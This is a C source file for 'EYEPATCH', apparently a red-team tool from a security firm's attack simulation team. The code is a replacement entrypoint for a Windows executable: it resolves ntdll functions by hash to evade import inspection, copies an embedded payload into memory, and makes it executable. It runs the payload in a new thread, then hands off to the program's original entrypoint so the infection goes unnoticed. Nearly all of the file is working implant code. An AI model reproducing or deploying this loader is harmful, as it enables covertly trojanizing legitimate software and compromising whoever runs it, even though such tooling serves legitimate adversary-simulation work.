/*!
 *
 * EYEPATCH
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( NtAllocateVirtualMemory );
	D_API( NtProtectVirtualMemory );
	D_API( NtWaitForSingleObject );
	D_API( RtlInitUnicodeString );
	D_API( RtlCreateUserThread );
	D_API( NtFreeVirtualMemory );
	D_API( CreateMutexA );
	D_API( LdrUnloadDll );
	D_API( NtCreateFile );
	D_API( LdrLoadDll );
	D_API( NtClose );
} API ;

/* API Hashes */
#define H_API_NTALLOCATEVIRTUALMEMORY	0xf783b8ec /* NtAllocateVirtualMemory */
#define H_API_NTPROTECTVIRTUALMEMORY	0x50e92888 /* NtProtectVirtualMemory */
#define H_API_NTWAITFORSINGLEOBJECT	0xe8ac0c3c /* NtWaitForSingleObject */
#define H_API_RTLINITUNICODESTRING	0xef52b589 /* RtlInitUnicodeString */
#define H_API_RTLCREATEUSERTHREAD	0x6c827322 /* RtlCreateUserThread */
#define H_API_NTFREEVIRTUALMEMORY	0x2802c609 /* NtFreeVirtualMemory */
#define H_API_CREATEMUTEXA		0x8952e8ed /* CreateMutexA */
#define H_API_LDRUNLOADDLL		0xd995c1e6 /* LdrUnloadDll */
#define H_API_NTCREATEFILE		0x66163fbb /* NtCreateFile */
#define H_API_LDRLOADDLL		0x9e456a43 /* LdrLoadDll */
#define H_API_NTCLOSE			0x40d6e69d /* NtClose */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Acts as a replacement PE entrypoint. Executes code
 * in a new virtual memory region, waits until it 
 * exits, then calls the original code.
 *
!*/
D_SEC( A ) INT WINAPI WinMain( HINSTANCE Instance, HINSTANCE hPrevInstance, LPSTR CommandLine, INT ShowCmd ) 
{
	API			Api;
	UNICODE_STRING		Uni;

	ULONG			Prt = 0;
	SIZE_T			Len = 0;

	HANDLE			Thd = NULL;
	LPVOID			K32 = NULL;
	LPVOID			Mem = NULL;
	HANDLE			Mut = NULL;
	PCONFIG			Cfg = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;

	Cfg = C_PTR( G_END() );
	Dos = C_PTR( G_PTR( WinMain ) );
	Dos = C_PTR( U_PTR( U_PTR( Dos ) &~ ( 0x1000 - 1 ) ) );

	do 
	{
		/* Has the DOS MZ Signature? */
		if ( Dos->e_magic == IMAGE_DOS_SIGNATURE ) {

			/* Is in between the size */
			if ( Dos->e_lfanew < 0x200 ) {
				/* Get a pointer to the NT Header */
				Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );

				/* Has the "NT" signature */
				if ( Nth->Signature == IMAGE_NT_SIGNATURE ) {
					/* Break! */
					break;
				};
			};
		};

		/* Decrement */
		Dos = C_PTR( U_PTR( U_PTR( Dos ) - 0x1000 ) );
	} while ( Dos != 0 );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	Api.NtAllocateVirtualMemory = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTALLOCATEVIRTUALMEMORY );
	Api.NtProtectVirtualMemory  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTPROTECTVIRTUALMEMORY );
	Api.NtWaitForSingleObject   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
	Api.RtlInitUnicodeString    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING );
	Api.RtlCreateUserThread     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATEUSERTHREAD );
	Api.NtFreeVirtualMemory     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTFREEVIRTUALMEMORY );
	Api.LdrUnloadDll            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
	Api.NtCreateFile            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATEFILE );
	Api.LdrLoadDll              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );
	Api.NtClose                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	Len = Cfg->Length;
	Mem = NULL;

	/* Create a block of memory we can use to store our payload */
	if ( NT_SUCCESS( Api.NtAllocateVirtualMemory( NtCurrentProcess(), &Mem, 0, &Len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) ) ) {

		/* Copy over entire buffer */
		__builtin_memcpy( Mem, Cfg->Buffer, Cfg->Length );

		/* Load kernel32.dll if we are not loaded already */
		Api.RtlInitUnicodeString( &Uni, C_PTR( G_PTR( L"kernel32.dll" ) ) );

		/* Load kernel32.dll */
		if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Uni, &K32 ) ) ) {
			/* Locate the CreateMutexA export! */
			if ( ( Api.CreateMutexA = PeGetFuncEat( K32, H_API_CREATEMUTEXA ) ) != NULL ) {
				Mut = Cfg->EnableMutex != 0 ? Api.CreateMutexA( NULL, FALSE, Cfg->MutexName ) : INVALID_HANDLE_VALUE;

				if ( Mut != NULL ) {
					if ( NtCurrentTeb()->LastErrorValue != ERROR_ALREADY_EXISTS ) { 
						if ( NT_SUCCESS( Api.NtProtectVirtualMemory( NtCurrentProcess(), &Mem, &Len, PAGE_EXECUTE_READ, &Prt ) ) ) {
							if ( NT_SUCCESS( Api.RtlCreateUserThread( NtCurrentProcess(), NULL, FALSE, 0, 0, 0, Mem, NULL, &Thd, NULL ) ) ) {
								if ( NT_SUCCESS( Api.NtWaitForSingleObject( Thd, FALSE, NULL ) ) ) {
								};
								Api.NtClose( Thd );
							};
						};
					};
					/* Cleanup */
					Api.NtClose( Mut );
				};
			};
			/* Cleanup */
			Api.LdrUnloadDll( K32 );
		};

		/* Cleanup */
		Len = 0;
		Api.NtFreeVirtualMemory( NtCurrentProcess(), &Mem, &Len, MEM_RELEASE );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	/* Execute entrypoint */
	return ( ( __typeof__( WinMain ) * ) C_PTR( U_PTR( Dos ) + Cfg->AddressOfEntryPoint ) )(
			Instance, hPrevInstance, CommandLine, ShowCmd
	);
};
